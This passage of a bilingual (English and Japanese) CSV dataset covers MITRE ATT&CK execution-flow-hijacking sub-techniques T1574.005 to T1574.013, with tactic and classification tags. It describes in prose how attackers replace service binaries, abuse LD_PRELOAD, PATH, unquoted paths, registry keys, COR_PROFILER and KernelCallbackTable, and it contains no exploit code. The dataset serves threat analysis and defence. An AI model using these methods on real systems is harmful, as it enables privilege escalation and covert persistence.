T1574.005,T1574,Executable Installer File Permissions Weakness,実行可能インストーラファイルの権限脆弱性,"Adversaries may execute their own malicious payloads by hijacking the binaries used by an installer. These processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM. Another variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the <code>%TEMP%</code> directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of [DLL](https://attack.mitre.org/techniques/T1574/001) search order hijacking. Adversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to [Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002). Several examples of this weakness in existing common installers have been reported to software vendors.(Citation: mozilla_sec_adv_2012) (Citation: Executable Installers are Vulnerable) If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.",攻撃者は、インストーラが使用するバイナリを乗っ取ることで、自身の悪意あるペイロードを実行できる。これらのプロセスは、機能の一部として、または他のアクションを実行するために、特定のバイナリを自動的に実行する場合がある。ターゲットとなるバイナリを含むファイルシステムディレクトリの権限、またはバイナリ自体の権限が不適切に設定されている場合、ターゲットとなるバイナリはユーザーレベルの権限を持つ別のバイナリで上書きされ、元のプロセスによって実行される可能性がある。 元のプロセスとスレッドがより高い権限レベルで実行されている場合、置換されたバイナリもSYSTEMを含むより高い権限レベルで実行される可能性があります。 この手法の別のバリエーションとして、実行可能で自己解凍型のインストーラーに共通する脆弱性を悪用する方法があります。インストールプロセス中、インストーラーは<code>%TEMP%</code>ディレクトリ内のサブディレクトリを使用して、DLL、EXE、その他のペイロードなどのバイナリを解凍することが一般的です。 インストーラーがサブディレクトリやファイルを作成する際、書き込みアクセスを制限する適切な権限を設定しないことが多く、これによりサブディレクトリに配置された信頼できないコードの実行や、インストールプロセスで使用されるバイナリの上書きが可能になります。この動作は[DLL](https://attack.mitre.org/techniques/T1574/001)検索順序の乗っ取りに関連し、これを悪用する可能性があります。 攻撃者はこの手法を用いて正当なバイナリを悪意のあるものに置き換え、より高い権限レベルでコードを実行する手段とする可能性があります。一部のインストーラーは昇格された特権を必要とする場合があり、攻撃者が制御するコードを実行すると特権昇格が発生します。この動作は[ユーザーアカウント制御のバイパス](https://attack.mitre.org/techniques/T1548/002)に関連しています。 既存の一般的なインストーラにおけるこの脆弱性の事例が複数、ソフトウェアベンダーに報告されている。(引用: mozilla_sec_adv_2012) (引用: Executable Installers are Vulnerable) 実行プロセスが特定の時刻または特定のイベント時（例: システム起動時）に実行されるように設定されている場合、この手法は永続化にも利用可能である。,persistence;privilege-escalation;defense-evasion,Windows,other,privilege_gain,privileged_account;user_interaction;endpoint_execution;file_storage_access,specified,Business Workstation;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2;S3,S2,C02;C03,Secondary Action;Secondary Intrusion,C02,Secondary Action,TA0003;TA0004;TA0005,attack-pattern--70d81154-b187-45f9-8ec5-295d01255979,2020-03-13T11:12:18.558Z,2025-04-15T19:58:41.123Z,,,,
T1574.006,T1574,Dynamic Linker Hijacking,ダイナミックリンカーハイジャック,"Adversaries may execute their own malicious payloads by hijacking environment variables the dynamic linker uses to load shared libraries. During the execution preparation phase of a program, the dynamic linker loads specified absolute paths of shared libraries from various environment variables and files, such as <code>LD_PRELOAD</code> on Linux or <code>DYLD_INSERT_LIBRARIES</code> on macOS.(Citation: TheEvilBit DYLD_INSERT_LIBRARIES)(Citation: Timac DYLD_INSERT_LIBRARIES)(Citation: Gabilondo DYLD_INSERT_LIBRARIES Catalina Bypass) Libraries specified in environment variables are loaded first, taking precedence over system libraries with the same function name.(Citation: Man LD.SO)(Citation: TLDP Shared Libraries)(Citation: Apple Doco Archive Dynamic Libraries) Each platform's linker uses an extensive list of environment variables at different points in execution. These variables are often used by developers to debug binaries without needing to recompile, deconflict mapped symbols, and implement custom functions in the original library.(Citation: Baeldung LD_PRELOAD) Hijacking dynamic linker variables may grant access to the victim process's memory, system/network resources, and possibly elevated privileges. On Linux, adversaries may set <code>LD_PRELOAD</code> to point to malicious libraries that match the name of legitimate libraries which are requested by a victim program, causing the operating system to load the adversary's malicious code upon execution of the victim program. For example, adversaries have used `LD_PRELOAD` to inject a malicious library into every descendant process of the `sshd` daemon, resulting in execution under a legitimate process. When the executing sub-process calls the `execve` function, for example, the malicious library’s `execve` function is executed rather than the system function `execve` contained in the system library on disk. This allows adversaries to [Hide Artifacts](https://attack.mitre.org/techniques/T1564) from detection, as hooking system functions such as `execve` and `readdir` enables malware to scrub its own artifacts from the results of commands such as `ls`, `ldd`, `iptables`, and `dmesg`.(Citation: ESET Ebury Oct 2017)(Citation: Intezer Symbiote 2022)(Citation: Elastic Security Labs Pumakit 2024) Hijacking dynamic linker variables may grant access to the victim process's memory, system/network resources, and possibly elevated privileges.",攻撃者は、共有ライブラリをロードするために動的リンカーが使用する環境変数をハイジャックすることで、独自の悪意のあるペイロードを実行する可能性があります。プログラムの実行準備フェーズにおいて、動的リンカーはLinuxの<code>LD_PRELOAD</code>やmacOSの<code>DYLD_INSERT_LIBRARIES</code>など、様々な環境変数やファイルから指定された共有ライブラリの絶対パスをロードします。(引用: TheEvilBit DYLD_INSERT_LIBRARIES)(引用: Timac DYLD_INSERT_LIBRARIES)(引用: Gabilondo DYLD_INSERT_LIBRARIES Catalina Bypass)環境変数で指定されたライブラリは、同じ関数名を持つシステムライブラリよりも優先的に最初にロードされる。(引用元: Man LD.SO)(引用元: TLDP Shared Libraries)(引用元: Apple Doco Archive Dynamic Libraries) 各プラットフォームのリンカは、実行中のさまざまなポイントで広範な環境変数リストを使用します。これらの変数は、再コンパイルを必要とせずにバイナリをデバッグしたり、マップされたシンボルの競合を解消したり、元のライブラリにカスタム関数を実装したりするために、開発者によって頻繁に使用されます。(引用: Baeldung LD_PRELOAD) 動的リンカ変数の乗っ取りは、被害プロセスへのメモリアクセス、システム/ネットワークリソースの取得、場合によっては特権昇格を可能にする。Linuxでは、攻撃者が<code>LD_PRELOAD</code>を悪意のあるライブラリを指すように設定し、被害プログラムが要求する正当なライブラリ名と一致させることで、被害プログラム実行時にOSが攻撃者の悪意あるコードをロードさせる。 例えば、攻撃者は`LD_PRELOAD`を利用して`sshd`デーモンのすべての子孫プロセスに悪意のあるライブラリを注入し、正当なプロセス下での実行を実現した。実行中のサブプロセスが`execve`関数を呼び出す場合、ディスク上のシステムライブラリに含まれるシステム関数`execve`ではなく、悪意のあるライブラリの`execve`関数が実行される。 これにより攻撃者は[痕跡の隠蔽](https://attack.mitre.org/techniques/T1564)が可能となる。`execve`や`readdir`といったシステム関数をフックすることで、マルウェアは`ls`、`ldd`、`iptables`、`dmesg`などのコマンド結果から自身の痕跡を消去できるからだ。(引用: ESET Ebury Oct 2017)(引用: Intezer Symbiote 2022)(引用: Elastic Security Labs Pumakit 2024) 動的リンカ変数のハイジャックにより、被害者プロセスのメモリ、システム/ネットワークリソース、場合によっては昇格された特権へのアクセスが可能になる。,persistence;privilege-escalation;defense-evasion,Linux;macOS,remote_service_abuse,privilege_gain,privileged_account;user_interaction;endpoint_execution;network_connectivity;file_storage_access,specified,Business Workstation;File Server;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2;S3,S2,C02;C03,Secondary Action;Secondary Intrusion,C02,Secondary Action,TA0003;TA0004;TA0005,attack-pattern--633a100c-b2c9-41bf-9be5-905c1b16c825,2020-03-13T20:09:59.569Z,2025-04-15T19:58:36.147Z,,,,
T1574.007,T1574,Path Interception by PATH Environment Variable,PATH環境変数によるパス傍受,"Adversaries may execute their own malicious payloads by hijacking environment variables used to load libraries. The PATH environment variable contains a list of directories (User and System) that the OS searches sequentially through in search of the binary that was called from a script or the command line. Adversaries can place a malicious program in an earlier entry in the list of directories stored in the PATH environment variable, resulting in the operating system executing the malicious binary rather than the legitimate binary when it searches sequentially through that PATH listing. For example, on Windows if an adversary places a malicious program named ""net.exe"" in `C:\example path`, which by default precedes `C:\Windows\system32\net.exe` in the PATH environment variable, when ""net"" is executed from the command-line the `C:\example path` will be called instead of the system's legitimate executable at `C:\Windows\system32\net.exe`. Some methods of executing a program rely on the PATH environment variable to determine the locations that are searched when the path for the program is not given, such as executing programs from a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059).(Citation: ExpressVPN PATH env Windows 2021) Adversaries may also directly modify the $PATH variable specifying the directories to be searched. An adversary can modify the `$PATH` variable to point to a directory they have write access. When a program using the $PATH variable is called, the OS searches the specified directory and executes the malicious binary. On macOS, this can also be performed through modifying the $HOME variable. These variables can be modified using the command-line, launchctl, [Unix Shell Configuration Modification](https://attack.mitre.org/techniques/T1546/004), or modifying the `/etc/paths.d` folder contents.(Citation: uptycs Fake POC linux malware 2023)(Citation: nixCraft macOS PATH variables)(Citation: Elastic Rules macOS launchctl 2022)",攻撃者は、ライブラリ読み込みに使用される環境変数をハイジャックすることで、自身の悪意あるペイロードを実行する可能性があります。PATH環境変数には、スクリプトやコマンドラインから呼び出されたバイナリを検索するためにOSが順次探索するディレクトリ（ユーザーおよびシステム）のリストが含まれています。 攻撃者は、PATH環境変数に格納されたディレクトリリストの先頭付近に悪意のあるプログラムを配置することで、OSがPATHリストを順次検索する際に正規のバイナリではなく悪意のあるバイナリを実行させる可能性があります。例えばWindowsでは、攻撃者が「net.exe」という悪意のあるプログラムを`C:\example path`（デフォルトでは`C:\Windows\system32\net.exe`よりも前に位置する場合、コマンドラインから「net」を実行すると、システム正規の実行ファイルである`C:\Windows\system32\net.exe`ではなく、`C:\example path`が呼び出されます。 プログラムの実行方法によっては、プログラムのパスが指定されていない場合に検索される場所を決定するためにPATH環境変数に依存するものがあります。例えば、[コマンドおよびスクリプトインタープリタ](https://attack.mitre.org/techniques/T1059)からプログラムを実行する場合などです。(引用元: ExpressVPN PATH env Windows 2021)攻撃者は検索対象ディレクトリを指定する`$PATH`変数を直接改変することも可能です。攻撃者は書き込み権限を持つディレクトリを指すよう`$PATH`変数を変更できます。`$PATH`変数を使用するプログラムが呼び出されると、OSは指定ディレクトリを検索し、悪意のあるバイナリを実行します。 macOSでは、`$HOME`変数の変更を通じて同様の手法が実行可能です。これらの変数は、コマンドライン、launchctl、[Unixシェル設定変更](https://attack.mitre.org/techniques/T1546/004)、または`/etc/paths.d`フォルダ内容の変更によって改変できます。(引用元: uptycs Fake POC linux malware 2023)(引用元: nixCraft macOS PATH variables)(引用元: Elastic Rules macOS launchctl 2022),persistence;privilege-escalation;defense-evasion,Windows;macOS;Linux,remote_service_abuse,privilege_gain,user_interaction;endpoint_execution;network_connectivity,specified,Business Workstation;Proxy / Gateway;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2;S3,S2,C02;C03,Secondary Action;Secondary Intrusion,C02,Secondary Action,TA0003;TA0004;TA0005,attack-pattern--0c2d00da-7742-49e7-9928-4514e5075d32,2020-03-13T14:10:43.424Z,2025-04-15T19:58:05.096Z,,,,
T1574.008,T1574,Path Interception by Search Order Hijacking,検索順序の乗っ取りによるパス傍受,"Adversaries may execute their own malicious payloads by hijacking the search order used to load other programs. Because some programs do not call other programs using the full path, adversaries may place their own file in the directory where the calling program is located, causing the operating system to launch their malicious software at the request of the calling program. Search order hijacking occurs when an adversary abuses the order in which Windows searches for programs that are not given a path. Unlike [DLL](https://attack.mitre.org/techniques/T1574/001) search order hijacking, the search order differs depending on the method that is used to execute the program. (Citation: Microsoft CreateProcess) (Citation: Windows NT Command Shell) (Citation: Microsoft WinExec) However, it is common for Windows to search in the directory of the initiating program before searching through the Windows system directory. An adversary who finds a program vulnerable to search order hijacking (i.e., a program that does not specify the path to an executable) may take advantage of this vulnerability by creating a program named after the improperly specified program and placing it within the initiating program's directory. For example, ""example.exe"" runs ""cmd.exe"" with the command-line argument <code>net user</code>. An adversary may place a program called ""net.exe"" within the same directory as example.exe, ""net.exe"" will be run instead of the Windows system utility net. In addition, if an adversary places a program called ""net.com"" in the same directory as ""net.exe"", then <code>cmd.exe /C net user</code> will execute ""net.com"" instead of ""net.exe"" due to the order of executable extensions defined under PATHEXT. (Citation: Microsoft Environment Property) Search order hijacking is also a common practice for hijacking DLL loads and is covered in [DLL](https://attack.mitre.org/techniques/T1574/001).",攻撃者は、他のプログラムをロードする際に使用される検索順序を乗っ取ることで、自身の悪意のあるペイロードを実行する可能性があります。一部のプログラムは完全なパスを使用して他のプログラムを呼び出さないため、攻撃者は呼び出し元プログラムが存在するディレクトリに自身のファイルを配置し、呼び出し元プログラムの要求に応じてオペレーティングシステムに自身の悪意のあるソフトウェアを起動させることが可能です。検索順序の乗っ取りは、攻撃者がパスが指定されていないプログラムを検索するWindowsの順序を悪用する際に発生します。 [DLL](https://attack.mitre.org/techniques/T1574/001)検索順序乗っ取りとは異なり、プログラムの実行方法によって検索順序は異なります。（引用元: Microsoft CreateProcess）（引用元: Windows NT Command Shell）（引用元: Microsoft WinExec） ただし、Windowsは通常、Windowsシステムディレクトリを検索する前に、起動元プログラムのディレクトリを検索します。検索順序ハイジャックの脆弱性を持つプログラム（つまり、実行ファイルへのパスを指定していないプログラム）を発見した攻撃者は、この脆弱性を悪用して、不適切に指定されたプログラムと同じ名前でプログラムを作成し、起動元プログラムのディレクトリ内に配置することができます。 例えば、「example.exe」がコマンドライン引数<code>net user</code>付きで「cmd.exe」を実行する場合、攻撃者が「example.exe」と同じディレクトリに「net.exe」というプログラムを配置すると、Windowsシステムユーティリティのnetではなく「net.exe」が実行される。 さらに、攻撃者が「net.exe」と同じディレクトリに「net.com」というプログラムを配置した場合、PATHEXTで定義された実行可能拡張子の順序により、<code>cmd.exe /C net user</code>は「net.exe」ではなく「net.com」を実行します。 (引用元: Microsoft Environment Property)検索順序の乗っ取りは、DLL ロードの乗っ取りにもよく用いられる手法であり、[DLL](https://attack.mitre.org/techniques/T1574/001) で説明されています。,persistence;privilege-escalation;defense-evasion,Windows,script_command_execution,privilege_gain,user_interaction;endpoint_execution;file_storage_access,specified,Business Workstation;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2;S3,S2,C02;C03,Secondary Action;Secondary Intrusion,C02,Secondary Action,TA0003;TA0004;TA0005,attack-pattern--58af3705-8740-4c68-9329-ec015a7013c2,2020-03-13T17:48:58.999Z,2025-04-15T19:58:33.873Z,,,,
T1574.009,T1574,Path Interception by Unquoted Path,引用符で囲まれていないパスによるパス傍受,"Adversaries may execute their own malicious payloads by hijacking vulnerable file path references. Adversaries can take advantage of paths that lack surrounding quotations by placing an executable in a higher level directory within the path, so that Windows will choose the adversary's executable to launch. Service paths (Citation: Microsoft CurrentControlSet Services) and shortcut paths may also be vulnerable to path interception if the path has one or more spaces and is not surrounded by quotation marks (e.g., <code>C:\unsafe path with space\program.exe</code> vs. <code>""C:\safe path with space\program.exe""</code>). (Citation: Help eliminate unquoted path) (stored in Windows Registry keys) An adversary can place an executable in a higher level directory of the path, and Windows will resolve that executable instead of the intended executable. For example, if the path in a shortcut is <code>C:\program files\myapp.exe</code>, an adversary may create a program at <code>C:\program.exe</code> that will be run instead of the intended program. (Citation: Windows Unquoted Services) (Citation: Windows Privilege Escalation Guide) This technique can be used for persistence if executables are called on a regular basis, as well as privilege escalation if intercepted executables are started by a higher privileged process.","攻撃者は脆弱なファイルパス参照を乗っ取ることで、自身の悪意あるペイロードを実行する可能性があります。攻撃者は、パス内の上位ディレクトリに実行可能ファイルを配置することで、引用符で囲まれていないパスを悪用し、Windowsが攻撃者の実行可能ファイルを選択して起動するように仕向けることができます。 サービスパス（引用元: Microsoft CurrentControlSet Services）やショートカットパスも、パスに1つ以上のスペースが含まれ引用符で囲まれていない場合（例: <code>C:\スペースを含む安全でないパス\program.exe</code> 対 <code>""C:\スペースを含む安全なパス\program.exe""</code>）、パス傍受の脆弱性を持つ可能性があります。（引用元: 引用符なしパスの排除を支援） （Windowsレジストリキーに保存）攻撃者は、パス上の上位ディレクトリに実行可能ファイルを配置でき、Windowsは意図した実行可能ファイルではなくそのファイルを解決します。例えば、ショートカットのパスが<code>C:\program files\myapp.exe</code>の場合、攻撃者は<code>C:\program.exe</code>にプログラムを作成し、意図したプログラムの代わりに実行させることが可能です。 (引用: Windows Unquoted Services) (引用: Windows Privilege Escalation Guide) この手法は、実行ファイルが定期的に呼び出される場合に永続化に利用可能であり、また、傍受された実行ファイルがより高い特権を持つプロセスによって起動される場合には権限昇格にも利用可能です。",persistence;privilege-escalation;defense-evasion,Windows,config_policy_manipulation,privilege_gain,privileged_account;endpoint_execution;file_storage_access,specified,Business Workstation;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2;S3,S2,C02;C03,Secondary Action;Secondary Intrusion,C02,Secondary Action,TA0003;TA0004;TA0005,attack-pattern--bf96a5a3-3bce-43b7-8597-88545984c07b,2020-03-13T13:51:58.519Z,2025-04-15T22:56:46.356Z,,,,
T1574.010,T1574,Services File Permissions Weakness,サービスファイルの権限の脆弱性,"Adversaries may execute their own malicious payloads by hijacking the binaries used by services. Adversaries may use flaws in the permissions of Windows services to replace the binary that is executed upon service start. These service processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM. Adversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.",攻撃者は、サービスが使用するバイナリを乗っ取ることで独自の悪意あるペイロードを実行する可能性があります。攻撃者は、Windows サービスの権限設定の欠陥を利用して、サービス起動時に実行されるバイナリを置き換える可能性があります。これらのサービスプロセスは、機能の一部として、またはその他のアクションを実行するために、特定のバイナリを自動的に実行する場合があります。 対象バイナリを含むファイルシステムディレクトリの権限、またはバイナリ自体の権限が不適切に設定されている場合、ユーザーレベル権限で別のバイナリに上書きされ、元のプロセスによって実行される可能性があります。元のプロセスとスレッドがより高い権限レベルで実行されている場合、置換されたバイナリもSYSTEMを含むより高い権限レベルで実行されます。 攻撃者はこの手法を用いて、正当なバイナリを悪意のあるバイナリに置き換え、より高い権限レベルでコードを実行する手段とする可能性があります。実行プロセスが特定の時刻または特定のイベント時（例：システム起動時）に実行されるように設定されている場合、この手法は永続化にも利用可能です。,persistence;privilege-escalation;defense-evasion,Windows,other,privilege_gain,user_interaction;endpoint_execution;file_storage_access,specified,Business Workstation;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2;S3,S2,C02;C03,Secondary Action;Secondary Intrusion,C02,Secondary Action,TA0003;TA0004;TA0005,attack-pattern--9e8b28c9-35fe-48ac-a14d-e6cc032dcbcd,2020-03-12T20:43:53.998Z,2025-04-25T14:47:32.419Z,,,,
T1574.011,T1574,Services Registry Permissions Weakness,サービス レジストリ権限の脆弱性,"Adversaries may execute their own malicious payloads by hijacking the Registry entries used by services. Adversaries may use flaws in the permissions for Registry keys related to services to redirect from the originally specified executable to one that they control, in order to launch their own code when a service starts. Windows stores local service configuration information in the Registry under <code>HKLM\SYSTEM\CurrentControlSet\Services</code>. The information stored under a service's Registry keys can be manipulated to modify a service's execution parameters through tools such as the service controller, sc.exe, [PowerShell](https://attack.mitre.org/techniques/T1059/001), or [Reg](https://attack.mitre.org/software/S0075). Access to Registry keys is controlled through access control lists and user permissions. (Citation: Registry Key Security)(Citation: malware_hides_service) If the permissions for users and groups are not properly set and allow access to the Registry keys for a service, adversaries may change the service's binPath/ImagePath to point to a different executable under their control. When the service starts or is restarted, then the adversary-controlled program will execute, allowing the adversary to establish persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService). Adversaries may also alter other Registry keys in the service’s Registry tree. For example, the <code>FailureCommand</code> key may be changed so that the service is executed in an elevated context anytime the service fails or is intentionally corrupted.(Citation: Kansa Service related collectors)(Citation: Tweet Registry Perms Weakness) The <code>Performance</code> key contains the name of a driver service's performance DLL and the names of several exported functions in the DLL.(Citation: microsoft_services_registry_tree) If the <code>Performance</code> key is not already present and if an adversary-controlled user has the <code>Create Subkey</code> permission, adversaries may create the <code>Performance</code> key in the service’s Registry tree to point to a malicious DLL.(Citation: insecure_reg_perms) Adversaries may also add the <code>Parameters</code> key, which stores driver-specific data, or other custom subkeys for their malicious services to establish persistence or enable other malicious activities.(Citation: microsoft_services_registry_tree)(Citation: troj_zegost) Additionally, If adversaries launch their malicious services using svchost.exe, the service’s file may be identified using <code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\servicename\Parameters\ServiceDll</code>.(Citation: malware_hides_service)",攻撃者は、サービスが使用するレジストリエントリを乗っ取ることで、自身の悪意のあるペイロードを実行する可能性があります。攻撃者は、サービスに関連するレジストリキーの権限の欠陥を利用し、サービス起動時に自身のコードを起動するために、元々指定された実行可能ファイルから自身が制御するファイルへリダイレクトする可能性があります。Windowsはローカルサービス構成情報を<code>HKLM\SYSTEM\CurrentControlSet\Services</code>下のレジストリに保存します。 サービスレジストリキーに保存された情報は、サービスコントローラー（sc.exe）、[PowerShell](https://attack.mitre.org/techniques/T1059/001)、または[Reg](https://attack.mitre.org/software/S0075)などのツールを通じて、サービスの実行パラメータを変更するために操作可能です。 レジストリキーへのアクセスは、アクセス制御リストとユーザー権限によって制御されます。(引用: レジストリキーのセキュリティ)(引用: malware_hides_service) ユーザーやグループの権限が適切に設定されておらず、サービスのレジストリキーへのアクセスが許可されている場合、攻撃者はサービスの binPath/ImagePath を、自分の制御下にある別の実行ファイルを指すように変更する可能性があります。 サービスが起動または再起動されると、攻撃者が制御するプログラムが実行され、攻撃者は永続化と/またはサービスが実行されるアカウントコンテキスト（ローカル/ドメインアカウント、SYSTEM、LocalService、NetworkService）への特権昇格を実現できます。 攻撃者はサービスのレジストリツリー内の他のキーも改変可能です。例えば<code>FailureCommand</code>キーを変更すれば、サービスが失敗または意図的に破損した際に常に昇格されたコンテキストで実行されるようになります。(引用元: Kansa Service related collectors)(引用元: Tweet Registry Perms Weakness)<code>Performance</code>キーには、ドライバサービスのパフォーマンスDLL名と、そのDLL内でエクスポートされている複数の関数名が格納されています。(引用元: microsoft_services_registry_tree) <code>Performance</code>キーがまだ存在せず、かつ攻撃者が制御するユーザーが<code>Create Subkey</code>権限を持っている場合、攻撃者はサービスのレジストリツリー内に<code>Performance</code>キーを作成し、悪意のあるDLLを指すように設定する可能性があります。(引用元: insecure_reg_perms) 攻撃者は、悪意のあるサービスが永続性を確立したり、その他の悪意のある活動を可能にするために、ドライバ固有のデータを格納する <code>Parameters</code> キーやその他のカスタムサブキーを追加することもあります。(引用元: microsoft_services_registry_tree)(引用元: troj_zegost) さらに、攻撃者がsvchost.exeを使用して悪意のあるサービスを起動する場合、サービスのファイルは<code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\servicename\Parameters\ServiceDll</code>を使用して特定される可能性があります。(引用元: malware_hides_service),persistence;privilege-escalation;defense-evasion,Windows,script_command_execution,privilege_gain,privileged_account;user_interaction;endpoint_execution;network_connectivity;file_storage_access,specified,Business Workstation;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2;S3,S2,C02;C03,Secondary Action;Secondary Intrusion,C02,Secondary Action,TA0003;TA0004;TA0005,attack-pattern--17cc750b-e95b-4d7d-9dde-49e0de24148c,2020-03-13T11:42:14.444Z,2025-04-15T19:58:09.308Z,,,,
T1574.012,T1574,COR_PROFILER,COR_PROFILER,"Adversaries may leverage the COR_PROFILER environment variable to hijack the execution flow of programs that load the .NET CLR. The COR_PROFILER is a .NET Framework feature which allows developers to specify an unmanaged (or external of .NET) profiling DLL to be loaded into each .NET process that loads the Common Language Runtime (CLR). These profilers are designed to monitor, troubleshoot, and debug managed code executed by the .NET CLR.(Citation: Microsoft Profiling Mar 2017)(Citation: Microsoft COR_PROFILER Feb 2013) The COR_PROFILER environment variable can be set at various scopes (system, user, or process) resulting in different levels of influence. System and user-wide environment variable scopes are specified in the Registry, where a [Component Object Model](https://attack.mitre.org/techniques/T1559/001) (COM) object can be registered as a profiler DLL. A process scope COR_PROFILER can also be created in-memory without modifying the Registry. Starting with .NET Framework 4, the profiling DLL does not need to be registered as long as the location of the DLL is specified in the COR_PROFILER_PATH environment variable.(Citation: Microsoft COR_PROFILER Feb 2013) Adversaries may abuse COR_PROFILER to establish persistence that executes a malicious DLL in the context of all .NET processes every time the CLR is invoked. The COR_PROFILER can also be used to elevate privileges (ex: [Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002)) if the victim .NET process executes at a higher permission level, as well as to hook and [Impair Defenses](https://attack.mitre.org/techniques/T1562) provided by .NET processes.(Citation: RedCanary Mockingbird May 2020)(Citation: Red Canary COR_PROFILER May 2020)(Citation: Almond COR_PROFILER Apr 2019)(Citation: GitHub OmerYa Invisi-Shell)(Citation: subTee .NET Profilers May 2017)",攻撃者は、COR_PROFILER環境変数を利用して、.NET CLRをロードするプログラムの実行フローを乗っ取る可能性があります。COR_PROFILERは.NET Frameworkの機能であり、開発者が共通言語ランタイム（CLR）をロードする各.NETプロセスにロードされる非管理（または.NET外部）のプロファイリングDLLを指定できるようにします。 これらのプロファイラは、.NET CLRによって実行されるマネージドコードの監視、トラブルシューティング、デバッグを目的としています。(引用: Microsoft Profiling 2017年3月)(引用: Microsoft COR_PROFILER 2013年2月) COR_PROFILER環境変数は、システム、ユーザー、プロセスの各スコープで設定可能であり、影響レベルが異なります。 システムおよびユーザー全体の環境変数スコープはレジストリで指定され、[Component Object Model](https://attack.mitre.org/techniques/T1559/001) (COM) オブジェクトをプロファイラ DLL として登録できます。レジストリを変更せずに、プロセススコープの COR_PROFILER をメモリ内に作成することも可能です。 .NET Framework 4以降では、DLLの場所がCOR_PROFILER_PATH環境変数で指定されていれば、プロファイリングDLLを登録する必要はありません（引用元：Microsoft COR_PROFILER 2013年2月）。攻撃者はCOR_PROFILERを悪用し、CLRが呼び出されるたびにすべての.NETプロセスのコンテキストで悪意のあるDLLを実行する永続化手段を確立する可能性があります。 また、COR_PROFILER は特権昇格にも利用可能です （例：[ユーザー アカウント制御のバイパス](https://attack.mitre.org/techniques/T1548/002)）。これは、標的の .NET プロセスがより高い権限レベルで実行されている場合や、.NET プロセスが提供する防御機能をフックして[防御機能の無効化](https://attack.mitre.org/techniques/T1562)を行う場合にも適用されます。(引用: RedCanary Mockingbird 2020年5月)(引用: Red Canary COR_PROFILER 2020年5月)(引用: Almond COR_PROFILER 2019年4月)(引用: GitHub OmerYa Invisi-Shell)(引用: subTee .NET Profilers 2017年5月),persistence;privilege-escalation;defense-evasion,Windows,script_command_execution,privilege_gain,user_interaction;endpoint_execution;file_storage_access;logging_monitoring,specified,Business Workstation;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2;S3,S2,C02;C03,Secondary Action;Secondary Intrusion,C02,Secondary Action,TA0003;TA0004;TA0005,attack-pattern--ffeb0780-356e-4261-b036-cfb6bd234335,2020-06-24T22:30:55.843Z,2025-04-25T14:48:41.257Z,,,,
T1574.013,T1574,KernelCallbackTable,KernelCallbackTable,"Adversaries may abuse the <code>KernelCallbackTable</code> of a process to hijack its execution flow in order to run their own payloads.(Citation: Lazarus APT January 2022)(Citation: FinFisher exposed ) The <code>KernelCallbackTable</code> can be found in the Process Environment Block (PEB) and is initialized to an array of graphic functions available to a GUI process once <code>user32.dll</code> is loaded.(Citation: Windows Process Injection KernelCallbackTable) An adversary may hijack the execution flow of a process using the <code>KernelCallbackTable</code> by replacing an original callback function with a malicious payload. Modifying callback functions can be achieved in various ways involving related behaviors such as [Reflective Code Loading](https://attack.mitre.org/techniques/T1620) or [Process Injection](https://attack.mitre.org/techniques/T1055) into another process. A pointer to the memory address of the <code>KernelCallbackTable</code> can be obtained by locating the PEB (ex: via a call to the <code>NtQueryInformationProcess()</code> [Native API](https://attack.mitre.org/techniques/T1106) function).(Citation: NtQueryInformationProcess) Once the pointer is located, the <code>KernelCallbackTable</code> can be duplicated, and a function in the table (e.g., <code>fnCOPYDATA</code>) set to the address of a malicious payload (ex: via <code>WriteProcessMemory()</code>). The PEB is then updated with the new address of the table. Once the tampered function is invoked, the malicious payload will be triggered.(Citation: Lazarus APT January 2022) The tampered function is typically invoked using a Windows message. After the process is hijacked and malicious code is executed, the <code>KernelCallbackTable</code> may also be restored to its original state by the rest of the malicious payload.(Citation: Lazarus APT January 2022) Use of the <code>KernelCallbackTable</code> to hijack execution flow may evade detection from security products since the execution can be masked under a legitimate process.",攻撃者は、プロセスの <code>KernelCallbackTable</code> を悪用してその実行フローを乗っ取り、自身のペイロードを実行する可能性があります。(引用: Lazarus APT 2022年1月)(引用: FinFisher exposed ) <code>KernelCallbackTable</code> はプロセス環境ブロック (PEB) 内に存在し、<code>user32.dll</code> がロードされると、GUI プロセスが利用可能なグラフィック関数の配列として初期化されます。(引用: Windows Process Injection KernelCallbackTable) 攻撃者は、元のコールバック関数を悪意のあるペイロードに置き換えることで、<code>KernelCallbackTable</code> を使用してプロセスの実行フローを乗っ取ることができます。 コールバック関数の変更は、[リフレクティブコードローディング](https://attack.mitre.org/techniques/T1620) や別のプロセスへの[プロセスインジェクション](https://attack.mitre.org/techniques/T1055) 